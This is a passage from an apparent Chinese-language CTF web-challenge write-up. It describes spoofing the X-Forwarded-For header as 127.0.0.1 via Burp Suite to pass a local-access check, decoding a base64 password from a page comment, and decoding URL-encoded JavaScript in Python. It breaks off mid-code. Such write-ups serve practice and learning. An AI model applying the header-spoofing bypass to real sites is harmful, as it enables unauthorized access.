代理或者负载均衡服务器时才会添加该项。\n也就是第一次发送的时候会记录本主机的ip，之后每次经过一个代理，\n都会在尾部添加一个代理的ip，\nX-Forwarded-For可以显示完整的传输路径和恶意攻击来源但是X-Forward-For可以被伪造。题目中说联系本地管理员，那就设置X-Forwarded-For为代表本地访问的127.0.0.1。\n同时查看网页源代码发现，有一串注释，查到说是base64编码，\n特征是结尾以一个或者两个=结束，解码后得到密码，输入后使用burpsuite进行拦截，\n添加X-Forwarded-For：127。0.0.1后发送，得到了flag\u003c/p\u003e\n\u003cp\u003e参考资料：ctf中常见的编码格式： \u003ca href=\"https://www.cnblogs.com/gwind/p/7997922.html\"\u003ehttps://www.cnblogs.com/gwind/p/7997922.html\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"web4\"\u003eweb4\u003c/h2\u003e\n\u003cp\u003e查看源代码，发现一串url编码的东西，\nEval函数会将里面的内容作为代码执行，unescape将其解码。要解码：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ea \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%6e%63%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%69%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6f\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%6e%20%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%68%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%63%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6b\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%53%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%62%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e6d\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%69%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e74\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e67\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e49\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e77\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e70\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e20\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e69\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e36\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e37\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e39\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e62\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eb \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%61%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%36%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e34\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%38%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e36\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%65%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e38\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%37%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%37%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%31%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e34\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%66%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e%22%\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e3d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e30\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e61\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e66\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003eb\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e72\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e21\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e31\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e63\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e67\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e45\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ed\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e79\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e49\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e64\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e28\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e76\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ec\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e51\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e75\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e65\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e74\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e22\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e29\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ef\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e6\u003c/span\u003ee\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e73\u003c/span\u003e\u003cspan 